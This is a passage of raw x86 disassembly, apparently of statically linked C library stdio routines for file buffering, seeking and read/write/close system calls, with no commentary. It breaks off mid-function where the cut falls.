lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x30]
xor edx, edx
inc eax
je 0x804de3e
test esi, esi
je 0x804ddf1
test edi, edi
jne 0x804de4b
or dword [ebx], 2
lea eax, [ebx + 0x48]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], eax
lea eax, [ebx + 0x47]
mov dword [var_sp_4h], eax
mov dword [esp], ebx
call fcn.0804db40
mov dword [ebx + 0x18], 0
mov dword [ebx + 0x14], 0
mov dword [ebx + 0x10], 0
mov dword [ebx + 8], 0
mov dword [ebx + 4], 0
mov dword [ebx + 0xc], 0
mov edx, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
lea eax, [edi + esi]
and dword [ebx], 0xfffffffd
mov dword [var_sp_4h], esi
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], eax
jmp 0x804de0a
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x18
mov ecx, dword [arg_8h]
mov eax, dword [arg_14h]
mov dword [var_4h], ebx
mov edx, dword [arg_10h]
mov ebx, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_ch], 0
mov dword [var_10h], eax
mov dword [var_8h], edx
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call dword [ebx + 0x24]
mov ebx, dword [var_4h]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
mov dword [var_ch], 0x22
mov dword [var_8h], 3
mov dword [var_4h], 0x2000
mov dword [esp], 0
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x804df1c
lea eax, [edx + 0x2000]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804db40
mov eax, 1
leave
ret
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0xffffffff
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e030
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
or eax, 0xfbad0000
mov edx, dword [esi + 0x48]
mov dword [esi], eax
mov dword [esi + 0x3c], 0
mov dword [esi + 0x1c], 0
mov dword [esi + 0x20], 0
mov dword [esi + 0xc], 0
mov dword [esi + 4], 0
mov dword [esi + 8], 0
mov dword [esi + 0x10], 0
test edx, edx
mov dword [esi + 0x14], 0
mov dword [esi + 0x18], 0
mov dword [esi + 0x34], 0
mov dword [esi + 0x24], 0
mov dword [esi + 0x28], 0
mov dword [esi + 0x2c], 0
mov dword [esi + 0x30], 0
mov word [esi + 0x44], 0
je 0x804e023
mov eax, 0
test eax, eax
je 0x804e023
lea ebx, [var_ch]
mov dword [esp], ebx
call section.
mov dword [esp], ebx
mov dword [var_sp_4h], 1
call section.
mov dword [var_sp_4h], ebx
mov eax, dword [esi + 0x48]
mov dword [esp], eax
call section.
mov dword [esp], ebx
call section.
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
mov ebx, dword [arg_10h]
mov dword [var_8h], esi
mov esi, dword [arg_14h]
mov dword [var_sp_4h], eax
mov dword [esp], edi
call fcn.0804df60
test ebx, ebx
mov dword [edi + 0x5c], ebx
js 0x804e0b6
mov eax, dword [arg_18h]
mov dword [edi + 0x58], esi
mov dword [esi + 0x18], 0
mov dword [esi + 0x1c], 0
mov dword [esi + 8], 0
mov dword [esi], 0
mov dword [esi + 4], 0
mov dword [esi + 0xc], 0
mov dword [esi + 0x10], 0
mov dword [esi + 0x14], 0
mov dword [esi + 0x20], 0
mov dword [esi + 0x24], 0
mov dword [esi + 0x28], 0
mov dword [esi + 0xb8], eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
jmp 0x804e0d0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
leave
ret
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push ebx
sub esp, 8
mov ebx, dword [var_8h]
mov edx, dword [ebx + 0x1c]
test edx, edx
je 0x804e0f6
test byte [ebx], 1
je 0x804e14e
mov eax, dword [ebx + 0x30]
test eax, eax
je 0x804e10d
lea esi, [esi]
mov dword [eax + 4], 0
mov eax, dword [eax]
test eax, eax
jne 0x804e100
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x804e13d
mov edx, dword [ebx + 0x48]
test edx, edx
je 0x804e130
mov eax, 0
test eax, eax
je 0x804e130
mov dword [esp], edx
call section.
lea esi, [esi]
mov dword [var_8h], ebx
add esp, 8
pop ebx
leave
jmp fcn.0804d500
mov dword [esp], eax
call fcn.08051180
mov dword [ebx + 0x24], 0
jmp 0x804e114
mov eax, dword [ebx + 0x20]
mov dword [esp], edx
sub eax, edx
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_sp_4h], eax
call fcn.08054780
mov dword [ebx + 0x1c], 0
mov dword [ebx + 0x20], 0
jmp 0x804e0f6
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x58]
mov dword [ebx + 0x94], 0x8092b00
mov dword [eax + 0xb8], 0x80929a0
mov dword [esp], ebx
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.0804bce0
test eax, eax
mov edx, eax
je 0x804bd76
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov eax, dword [ebx + 0x58]
mov dword [ebx + 0x94], 0x8092b60
mov dword [eax + 0xb8], 0x8092a00
jmp 0x804bd6f
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x1c
mov esi, dword [arg_8h]
mov edx, dword [esi]
test dl, 4
jne 0x804c041
mov eax, dword [esi + 4]
cmp eax, dword [esi + 8]
jb 0x804bfbf
mov ecx, dword [esi + 0x1c]
test ecx, ecx
jne 0x804beee
mov eax, dword [esi + 0x24]
test eax, eax
jne 0x804c02e
mov dword [esp], esi
call fcn.0804dbb0
mov edx, dword [esi]
and edx, 0x202
je 0x804bf5a
mov edx, dword [0x80a9500]
xor ebx, ebx
cmp word [edx], 0
js 0x804bf30
mov eax, 0
test eax, eax
je 0x804bf30
lea eax, [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov ebx, 1
call section.
mov edx, dword [0x80a9500]
nop
cmp word [edx], 0
jns 0x804c01b
mov eax, dword [edx]
and eax, 0x288
cmp eax, 0x280
je 0x804bffc
cmp word [edx], 0
jns 0x804bfef
test ebx, ebx
jne 0x804bfd7
mov dword [esp], esi
call fcn.0804d770
mov edx, dword [esi + 0x20]
mov eax, dword [esi + 0x1c]
mov ecx, dword [esi + 0x94]
sub edx, eax
mov dword [esi + 4], eax
mov dword [esi + 0xc], eax
mov dword [esi + 8], eax
mov dword [esi + 0x18], eax
mov dword [esi + 0x14], eax
mov dword [esi + 0x10], eax
mov dword [esp], esi
mov dword [var_4h], eax
mov dword [var_8h], edx
call dword [ecx + 0x38]
test eax, eax
mov edx, eax
jle 0x804bfc9
add dword [esi + 8], edx
mov eax, 0xffffffff
test edx, edx
je 0x804bfc2
mov ecx, dword [esi + 0x4c]
mov ebx, dword [esi + 0x50]
mov eax, ecx
and eax, ebx
inc eax
je 0x804bfbc
mov eax, edx
cdq
add ecx, eax
adc ebx, edx
mov dword [esi + 0x4c], ecx
mov dword [esi + 0x50], ebx
mov eax, dword [esi + 4]
movzx eax, byte [eax]
add esp, 0x1c
pop ebx
pop esi
leave
ret
jne 0x804bfd0
or dword [esi], 0x10
jmp 0x804bf96
or dword [esi], 0x20
xor edx, edx
jmp 0x804bf96
lea eax, [var_18h]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804bf5a
mov dword [esp], edx
call fcn.08074580
jmp 0x804bf56
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, dword [0x80a9500]
jmp 0x804bf4c
mov dword [esp], edx
call fcn.08074540
mov edx, dword [0x80a9500]
jmp 0x804bf3a
mov dword [esp], eax
call fcn.08051180
and dword [esi], 0xfffffeff
jmp 0x804bee4
or edx, 0x20
mov dword [esi], edx
call fcn.08048b20
mov dword [eax], 9
mov eax, 0xffffffff
jmp 0x804bfc2
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_ch]
mov esi, dword [arg_8h]
mov edx, dword [esi]
test dl, 8
jne 0x804c75d
test dh, 8
je 0x804c74d
mov ebx, dword [esi + 0x10]
test ebx, ebx
jne 0x804c63b
mov dword [esp], esi
call fcn.0804dbb0
mov eax, dword [esi + 0x1c]
mov edx, dword [esi]
mov dword [esi + 0xc], eax
mov dword [esi + 4], eax
mov dword [esi + 8], eax
test dh, 1
jne 0x804c723
mov ecx, dword [esi + 4]
mov ebx, dword [esi + 0x20]
cmp ecx, ebx
je 0x804c713
mov eax, dword [esi + 8]
mov dword [esi + 0x14], ecx
mov dword [esi + 0x10], ecx
mov dword [esi + 0x18], ebx
mov dword [esi + 4], eax
mov dword [esi + 0xc], eax
mov eax, edx
mov edx, dword [esi + 0x5c]
or ah, 8
mov dword [esi], eax
test edx, edx
jle 0x804c700
cmp edi, 0xffffffff
je 0x804c6e1
mov edx, dword [esi + 0x14]
cmp edx, dword [esi + 0x20]
je 0x804c695
mov eax, edi
mov byte [edx], al
mov eax, dword [esi]
mov edx, dword [esi + 0x14]
inc edx
test al, 2
mov dword [esi + 0x14], edx
jne 0x804c676
test ah, 2
je 0x804c667
cmp edi, 0xa
je 0x804c676
mov eax, edi
movzx edx, al
add esp, 0xc
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [esi + 0x10]
mov dword [esp], esi
sub edx, eax
mov dword [var_4h], eax
mov dword [var_8h], edx
call fcn.0804bd90
mov edx, 0xffffffff
inc eax
jne 0x804c667
jmp 0x804c66c
mov eax, dword [esi + 0x5c]
test eax, eax
jle 0x804c6ca
mov edx, dword [esi + 0x58]
mov eax, dword [edx + 0x10]
sub eax, dword [edx + 0xc]
sar eax, 2
mov dword [var_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], esi
mov dword [var_4h], eax
call fcn.0804a340
inc eax
je 0x804c6c3
mov edx, dword [esi + 0x14]
jmp 0x804c64c
mov edx, 0xffffffff
jmp 0x804c66c
mov eax, dword [esi + 0x10]
mov dword [esp], esi
sub edx, eax
mov dword [var_4h], eax
mov dword [var_8h], edx
call fcn.0804bd90
jmp 0x804c6bb
mov edx, dword [esi + 0x10]
mov eax, dword [esi + 0x14]
mov dword [esp], esi
sub eax, edx
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0804bd90
mov edx, eax
jmp 0x804c66c
test eax, 0x202
je 0x804c63b
mov dword [esi + 0x18], ecx
jmp 0x804c63b
mov eax, dword [esi + 0x1c]
mov dword [esi + 4], eax
mov dword [esi + 8], eax
mov ecx, eax
jmp 0x804c617
mov ebx, dword [esi + 8]
sub ebx, dword [esi + 4]
mov dword [esp], esi
call fcn.0804d7f0
mov edx, dword [esi + 0xc]
mov eax, edx
sub eax, dword [esi + 0x1c]
cmp eax, ebx
cmova eax, ebx
sub edx, eax
mov dword [esi + 0xc], edx
mov dword [esi + 4], edx
mov edx, dword [esi]
jmp 0x804c609
mov ecx, dword [esi + 0x10]
test ecx, ecx
jne 0x804c600
jmp 0x804c5ea
or edx, 0x20
mov dword [esi], edx
call fcn.08048b20
mov dword [eax], 9
jmp 0x804c6c3
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
xor esi, esi
mov edx, dword [ebx + 0x14]
mov eax, dword [ebx + 0x10]
cmp edx, eax
jbe 0x804c7d8
mov ecx, dword [ebx + 0x5c]
test ecx, ecx
jle 0x804c833
mov edx, dword [ebx + 0x58]
mov eax, dword [edx + 0x10]
sub eax, dword [edx + 0xc]
sar eax, 2
mov dword [var_sp_8h], eax
mov eax, dword [edx + 0xc]
mov dword [esp], ebx
mov dword [var_sp_4h], eax
call fcn.0804a340
test eax, eax
je 0x804c7d8
mov eax, 0xffffffff
mov esi, esi
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov eax, dword [ebx + 4]
mov edx, eax
sub edx, dword [ebx + 8]
jne 0x804c7f4
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov eax, esi
jmp 0x804c7d0
mov eax, dword [ebx + 0x94]
mov ecx, edx
mov dword [esp], ebx
sar ecx, 0x1f
mov dword [var_ch], 1
mov dword [var_sp_4h], edx
mov dword [var_sp_8h], ecx
call dword [eax + 0x40]
and eax, edx
inc eax
je 0x804c822
mov eax, dword [ebx + 4]
mov dword [ebx + 8], eax
jmp 0x804c7e2
call fcn.08048b20
cmp dword [eax], 0x1d
je 0x804c7e2
mov esi, 0xffffffff
jmp 0x804c7f0
sub edx, eax
mov dword [var_sp_4h], eax
mov dword [esp], ebx
mov dword [var_sp_8h], edx
call fcn.0804bd90
jmp 0x804c7c5
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [arg_8h]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov edi, dword [eax + 4]
cmp edi, dword [eax + 8]
je 0x804c8e1
mov dword [var_sp_ch], 0
sub edi, dword [eax + 0x1c]
mov edx, edi
mov dword [var_sp_4h], edi
sar edx, 0x1f
mov dword [var_sp_8h], edx
mov eax, dword [eax + 0x38]
mov dword [esp], eax
call fcn.08054840
mov ecx, dword [arg_8h]
mov esi, edx
mov edi, dword [ecx + 4]
mov ecx, dword [ecx + 0x1c]
mov dword [var_10h], ecx
mov ecx, edi
sub ecx, dword [var_10h]
mov ebx, ecx
xor eax, ecx
sar ebx, 0x1f
xor esi, ebx
or esi, eax
jne 0x804c8d4
sub edi, dword [var_10h]
mov ecx, dword [arg_8h]
mov eax, edi
mov dword [ecx + 0x4c], edi
sar eax, 0x1f
mov dword [ecx + 0x50], eax
mov eax, dword [ecx + 0xc]
mov dword [ecx + 4], eax
mov dword [ecx + 8], eax
xor eax, eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov eax, dword [arg_8h]
or dword [eax], 0x20
mov eax, 0xffffffff
jmp 0x804c8c9
mov edx, dword [arg_8h]
mov edx, dword [edx + 0x1c]
mov dword [var_10h], edx
jmp 0x804c8ad
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xa4
mov dword [var_80h], 0
mov ebx, dword [arg_18h]
mov edi, dword [arg_8h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov esi, dword [arg_14h]
mov dword [var_74h], eax
mov eax, dword [edi + 8]
cmp dword [edi + 0xc], eax
mov dword [var_70h], edx
je 0x804cd04
mov edx, dword [edi + 0x10]
mov eax, dword [edi + 0x14]
test ebx, ebx
jne 0x804c941
mov esi, 1
mov dword [var_74h], 0
mov dword [var_70h], 0
cmp eax, edx
ja 0x804c94b
test byte [edi + 1], 8
je 0x804c965
mov dword [esp], edi
call fcn.0804d770
mov ecx, 0xffffffff
test eax, eax
mov edx, 0xffffffff
jne 0x804cbb1
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x804c994
mov eax, dword [edi + 0xc]
test eax, eax
jne 0x804ccf1
mov dword [esp], edi
call fcn.0804dbb0
mov eax, dword [edi + 0x1c]
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov dword [edi + 0xc], eax
mov dword [edi + 4], eax
mov dword [edi + 8], eax
cmp esi, 1
je 0x804cca6
jle 0x804c9a8
cmp esi, 2
je 0x804cc65
test ebx, ebx
mov edx, dword [var_74h]
mov ecx, dword [var_70h]
je 0x804cbb1
mov ecx, dword [edi + 0x4c]
mov ebx, dword [edi + 0x50]
mov dword [var_a0h], ecx
mov dword [var_9ch], ebx
mov eax, dword [var_a0h]
and eax, ebx
inc eax
je 0x804cc5e
mov ebx, dword [edi + 0xc]
test ebx, ebx
mov dword [var_84h], ebx
je 0x804cc5e
mov eax, dword [edi]
test ah, 1
mov dword [var_88h], eax
mov edx, eax
jne 0x804ca70
mov ecx, dword [var_74h]
mov ebx, dword [var_70h]
sub ecx, dword [var_a0h]
mov eax, dword [edi + 8]
sbb ebx, dword [var_9ch]
sub eax, dword [var_84h]
mov dword [var_90h], ecx
mov dword [var_8ch], ebx
mov dword [var_98h], eax
mov ebx, eax
sar ebx, 0x1f
mov ecx, dword [var_98h]
add dword [var_90h], ecx
mov dword [var_94h], ebx
mov ebx, dword [var_94h]
adc dword [var_8ch], ebx
mov eax, dword [var_8ch]
test eax, eax
js 0x804ca70
cmp dword [var_8ch], ebx
jg 0x804ca70
jl 0x804cc00
cmp dword [var_90h], ecx
jbe 0x804cc00
nop
lea esi, [esi]
and edx, 4
jne 0x804cb60
mov eax, dword [edi + 0x20]
mov ebx, dword [var_74h]
sub eax, dword [edi + 0x1c]
mov esi, dword [var_70h]
mov edx, eax
neg edx
mov ecx, edx
and ebx, edx
mov edx, dword [var_74h]
sar ecx, 0x1f
and esi, ecx
mov ecx, dword [var_70h]
sub edx, ebx
mov dword [var_7ch], edx
sbb ecx, esi
cdq
cmp ecx, edx
mov dword [var_78h], ecx
jl 0x804cac4
jg 0x804cab0
cmp dword [var_7ch], eax
jbe 0x804cac4
mov esi, esi
mov ebx, dword [var_74h]
mov esi, dword [var_70h]
mov dword [var_7ch], 0
mov dword [var_78h], 0
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_8h], esi
mov dword [var_4h], ebx
mov dword [var_ch], 0
call dword [eax + 0x40]
mov ecx, 0xffffffff
mov esi, edx
mov ebx, eax
mov edx, 0xffffffff
test esi, esi
js 0x804cbb1
xor ecx, ecx
mov eax, dword [var_78h]
or eax, dword [var_7ch]
je 0x804cbc0
mov eax, dword [var_80h]
mov ecx, dword [edi + 0x94]
test eax, eax
jne 0x804cbf5
mov edx, dword [edi + 0x20]
mov eax, dword [edi + 0x1c]
sub edx, eax
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], edi
call dword [ecx + 0x38]
cdq
mov ecx, eax
cmp edx, dword [var_78h]
jg 0x804cbc0
jl 0x804cb42
cmp eax, dword [var_7ch]
jae 0x804cbc0
mov ebx, dword [var_7ch]
mov esi, dword [var_78h]
inc ecx
mov dword [var_74h], ebx
mov dword [var_70h], esi
je 0x804cb57
sub dword [var_74h], eax
sbb dword [var_70h], edx
mov esi, 1
lea esi, [esi]
mov dword [esp], edi
call fcn.0804e6b0
mov eax, dword [edi + 0x94]
mov edx, dword [var_74h]
mov dword [esp], edi
mov ecx, dword [var_70h]
mov dword [var_ch], esi
mov dword [var_4h], edx
mov dword [var_8h], ecx
call dword [eax + 0x40]
mov ebx, eax
mov esi, edx
and eax, edx
inc eax
je 0x804cbad
mov eax, dword [edi + 0x1c]
and dword [edi], 0xffffffef
mov dword [edi + 0x4c], ebx
mov dword [edi + 0x50], edx
mov dword [edi + 0xc], eax
mov dword [edi + 4], eax
mov dword [edi + 8], eax
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi + 0x18], eax
mov edx, ebx
mov ecx, esi
add esp, 0xa4
mov eax, edx
mov edx, ecx
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [edi + 0x1c]
mov eax, dword [var_7ch]
add eax, edx
mov dword [edi + 0xc], edx
mov dword [edi + 0x14], edx
mov dword [edi + 4], eax
mov dword [edi + 0x10], edx
mov dword [edi + 0x18], edx
lea eax, [ecx + edx]
mov dword [edi + 8], eax
mov eax, ecx
cdq
add eax, ebx
adc edx, esi
mov dword [edi + 0x4c], eax
and dword [edi], 0xffffffef
mov dword [edi + 0x50], edx
mov edx, dword [var_74h]
mov ecx, dword [var_70h]
jmp 0x804cbb1
mov edx, dword [var_7ch]
mov eax, dword [edi + 0x1c]
jmp 0x804cb1d
and dword [var_88h], 0xffffffef
mov eax, dword [edi + 0x1c]
mov ebx, dword [var_88h]
mov ecx, dword [var_90h]
mov dword [edi + 0xc], eax
mov dword [edi + 0x14], eax
mov dword [edi + 0x10], eax
mov dword [edi], ebx
lea edx, [ecx + eax]
mov dword [edi + 0x18], eax
mov ebx, dword [var_9ch]
mov dword [edi + 4], edx
test ebx, ebx
js 0x804cbed
mov eax, dword [edi + 0x94]
mov edx, dword [var_a0h]
mov dword [esp], edi
mov ecx, dword [var_9ch]
mov dword [var_ch], 0
mov dword [var_4h], edx
mov dword [var_8h], ecx
call dword [eax + 0x40]
jmp 0x804cbed
mov edx, dword [edi]
jmp 0x804ca70
mov eax, dword [edi + 0x94]
lea edx, [var_6ch]
mov dword [esp], edi
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
jne 0x804cb60
mov eax, dword [var_5ch]
and eax, 0xf000
cmp eax, 0x8000
jne 0x804cb60
mov edx, dword [var_40h]
mov ecx, dword [var_3ch]
add dword [var_74h], edx
adc dword [var_70h], ecx
xor esi, esi
jmp 0x804c9a8
mov eax, dword [edi + 8]
mov ecx, dword [edi + 0x50]
sub eax, dword [edi + 4]
cdq
sub dword [var_74h], eax
sbb dword [var_70h], edx
mov edx, dword [edi + 0x4c]
mov eax, edx
and eax, ecx
inc eax
je 0x804cb60
add dword [var_74h], edx
adc dword [var_70h], ecx
xor esi, esi
mov eax, dword [var_70h]
test eax, eax
jns 0x804c9a8
call fcn.08048b20
mov ecx, 0xffffffff
mov edx, 0xffffffff
mov dword [eax], 0x16
jmp 0x804cbb1
mov dword [esp], eax
call fcn.08051180
and dword [edi], 0xfffffeff
jmp 0x804c977
mov edx, dword [edi + 0x10]
mov eax, dword [edi + 0x14]
cmp edx, eax
jne 0x804c92a
mov dword [var_80h], 1
jmp 0x804c92a
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov edx, dword [arg_18h]
mov eax, dword [arg_14h]
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
test edx, edx
jne 0x804cd5c
mov edx, dword [arg_8h]
mov esi, dword [arg_8h]
mov eax, dword [edx + 8]
mov ecx, dword [esi + 0x4c]
sub eax, dword [edx + 4]
mov ebx, dword [esi + 0x50]
cdq
sub ecx, eax
sbb ebx, edx
add esp, 0x1c
mov edx, ebx
mov eax, ecx
pop ebx
pop esi
pop edi
leave
ret
cmp eax, 1
je 0x804ce35
jle 0x804cd70
cmp eax, 2
je 0x804ce22
test edi, edi
js 0x804ce08
mov edx, dword [arg_8h]
mov ebx, 0xffffffff
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_8h], edi
mov dword [var_ch], 0
mov dword [var_4h], esi
call dword [eax + 0x40]
mov ecx, 0xffffffff
mov dword [var_14h], eax
mov dword [var_10h], edx
mov eax, dword [var_10h]
test eax, eax
js 0x804cd50
mov ecx, dword [arg_8h]
mov eax, dword [arg_8h]
mov ecx, dword [ecx + 0x20]
mov edx, dword [eax + 0x1c]
mov eax, ecx
mov dword [var_18h], ecx
sub eax, edx
mov ebx, eax
sar ebx, 0x1f
cmp edi, ebx
jl 0x804ce00
jg 0x804cdd0
cmp esi, eax
jbe 0x804ce00
mov ecx, dword [arg_8h]
mov eax, dword [var_18h]
mov dword [ecx + 0xc], edx
mov dword [ecx + 4], eax
mov dword [ecx + 8], eax
mov edx, dword [var_10h]
mov ecx, dword [arg_8h]
mov eax, dword [var_14h]
mov ebx, edi
mov dword [ecx + 0x4c], eax
mov dword [ecx + 0x50], edx
and dword [ecx], 0xffffffef
mov ecx, esi
jmp 0x804cd50
lea esi, [esi]
mov ecx, dword [arg_8h]
lea eax, [esi + edx]
jmp 0x804cdd6
call fcn.08048b20
mov ebx, 0xffffffff
mov ecx, 0xffffffff
mov dword [eax], 0x16
jmp 0x804cd50
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x20]
sub eax, dword [ecx + 0x1c]
cdq
add esi, eax
adc edi, edx
jmp 0x804cd70
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
sub eax, dword [edx + 0xc]
jmp 0x804ce2b
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], esi
mov eax, dword [arg_14h]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov edx, dword [arg_10h]
mov ebx, 0xffffffff
mov ecx, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_sp_8h], edx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call dword [ecx + 0x40]
mov ecx, 0xffffffff
test edx, edx
js 0x804ce88
mov dword [esi + 0x4c], eax
mov dword [esi + 0x50], edx
mov ecx, eax
mov ebx, edx
mov edx, ebx
mov esi, dword [var_4h]
mov eax, ecx
mov ebx, dword [var_8h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_4h], ebx
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
test byte [eax + 0x3c], 2
jne 0x804ced0
mov dword [var_8h], edx
mov dword [var_sp_4h], ecx
mov eax, dword [eax + 0x38]
mov dword [esp], eax
call fcn.08053f70
mov ebx, dword [var_4h]
leave
ret
mov ebx, dword [eax + 0x38]
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804cee7
mov eax, ebx
jmp 0x804cecb
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804cee3
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x38]
mov dword [arg_8h], eax
leave
jmp fcn.08054840
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x38]
mov dword [esp], 3
mov dword [var_4h], eax
call fcn.08053dc0
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x1c]
mov eax, dword [ebx + 0x20]
sub eax, edx
mov dword [esp], edx
mov dword [var_sp_4h], eax
call fcn.08054780
mov dword [ebx + 0x1c], 0
mov dword [ebx + 0x20], 0
mov ebx, dword [ebx + 0x38]
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804cf98
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804cf91
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ebx, dword [eax + 0x38]
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804cfd1
mov eax, ebx
mov ebx, dword [esp]
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804cfca
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_10h]
mov edi, dword [arg_ch]
test esi, esi
jle 0x804d02e
mov eax, dword [arg_8h]
test byte [eax + 0x3c], 2
jne 0x804d062
mov edx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov eax, dword [edx + 0x38]
mov dword [esp], eax
call fcn.08053fd0
test eax, eax
js 0x804d05a
sub esi, eax
add edi, eax
test esi, esi
jg 0x804d003
mov eax, dword [arg_8h]
sub dword [arg_10h], esi
mov ebx, dword [eax + 0x50]
mov ecx, dword [eax + 0x4c]
test ebx, ebx
js 0x804d04f
mov eax, dword [arg_10h]
cdq
add ecx, eax
adc ebx, edx
mov edx, dword [arg_8h]
mov dword [edx + 0x4c], ecx
mov dword [edx + 0x50], ebx
mov eax, dword [arg_10h]
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_8h]
or dword [ecx], 0x20
jmp 0x804d02e
mov ebx, dword [eax + 0x38]
mov ecx, edi
mov edx, esi
mov eax, 4
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804d07d
mov eax, ebx
jmp 0x804d022
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804d079
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
mov dword [var_14h], eax
mov dword [var_10h], edx
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x804d232
mov eax, dword [edi + 0x24]
test eax, eax
jne 0x804d365
mov dword [esp], edi
call fcn.0804dbb0
mov esi, dword [arg_10h]
test esi, esi
je 0x804d2eb
lea esi, [esi]
mov ebx, dword [edi + 8]
mov eax, dword [edi + 4]
sub ebx, eax
cmp dword [var_10h], ebx
jbe 0x804d340
test ebx, ebx
